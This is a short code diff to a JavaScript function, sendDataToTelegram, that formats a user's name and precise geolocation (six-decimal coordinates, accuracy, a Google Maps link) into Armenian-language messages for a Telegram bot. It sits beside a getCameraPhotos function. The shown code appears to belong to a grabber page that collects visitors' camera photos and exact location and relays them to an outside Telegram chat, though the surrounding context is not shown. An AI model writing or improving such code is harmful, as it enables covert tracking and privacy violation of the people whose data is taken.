@@ -199,9 +199,12 @@ async function getCameraPhotos() {
 function sendDataToTelegram(username, geo, photos) {
   const messageParts = [];
   if (username) messageParts.push(`Անուն: ${username}`);
+
   if (geo) {
-    const mapUrl = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
-    messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude}, Լոնգ․ ${geo.longitude}, Ճշգրտություն՝ ${geo.accuracy}մ\nՄոտավորապես՝ ${mapUrl}`);
+    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
+    messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude.toFixed(6)}, Լոնգ․ ${geo.longitude.toFixed(6)}, Ճշգրտություն՝ ${geo.accuracy}մ\nԿարգավիճակ՝ ${mapUrl}`);
+  } else {
+    messageParts.push("Տեղադրություն չի տրված։");
   }
 
   const textMessage = encodeURIComponent(messageParts.join('\n'));
